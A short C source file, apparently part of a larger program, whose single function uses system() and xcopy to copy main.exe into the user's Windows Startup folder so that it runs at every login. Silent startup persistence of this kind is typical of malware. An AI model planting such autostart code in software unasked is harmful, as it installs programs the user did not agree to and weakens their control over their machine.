#include "handler.h"


void startupexec()
{
    system("xcopy main.exe \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    //copies main.exe to startup folder
}